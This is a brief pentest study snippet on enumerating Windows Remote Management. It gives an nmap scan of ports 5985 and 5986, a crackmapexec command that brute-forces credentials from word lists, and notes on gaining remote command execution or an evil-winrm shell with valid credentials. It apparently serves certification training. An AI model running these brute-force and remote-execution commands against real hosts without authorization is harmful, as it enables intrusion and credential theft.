---
title: "WinRM enumeration"
description: "Confirm WinRM is running and brute-force credentials for remote Windows management access."
pubDate: 2026-08-01
category: "Cybersecurity"
source: "INE Certification"
lang: "bash"
tags: ["winrm", "enumeration", "windows", "nmap","crackmapexec"]
draft: false
---

WinRM (Windows Remote Management) isn't enabled by default, so finding it listening at all is a mild signal that the host is set up for remote administration. That usually makes remote command execution a very good possibility if anything is misconfigured.

| Port | Transport |
| --- | --- |
| 5985 | HTTP |
| 5986 | HTTPS |

## Discover

```bash
nmap -sS -sV -p5985,5986 <target_ip>          # 5985 = HTTP, 5986 = HTTPS
```

## Brute-force

```bash
crackmapexec winrm <target_ip> -u username.txt -p passwords.txt
```

## With valid credentials

`crackmapexec winrm <target> -u <user> -p <pass> -x "<command>"` gives you remote command execution directly, or `evil-winrm` gets you a full interactive shell.

## Related

- [WinRM exploitation](/snippets/cybersecurity/exploitation/remote-service-exploitation/winrm-exploitation): brute-force and remote command execution
- [CrackMapExec](/snippets/cybersecurity/tools/credential-attack-tools/crackmapexec): protocol swiss-army knife
- [Nmap](/snippets/cybersecurity/tools/scanning-enumeration-tools/nmap): port and service scanning
